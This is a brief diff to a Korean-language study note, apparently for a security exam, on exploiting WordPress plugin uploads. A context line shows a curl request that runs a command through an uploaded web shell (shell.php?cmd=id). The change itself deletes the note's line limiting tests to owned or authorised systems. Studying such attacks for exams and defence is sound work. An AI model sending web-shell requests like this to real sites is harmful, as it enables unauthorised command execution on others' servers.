@@ -53,4 +53,3 @@ curl "http://target/wp-content/uploads/2026/10/shell.php?cmd=id"
 
 - `url-encoding.md`(같은 폴더)에 쿠키 디코딩 정리가 있다.
 - 플러그인 업로드 취약점은 시험에서 자주 함께 등장한다. 두 문제를 묶어 풀면 된다.
-- 모든 테스트는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
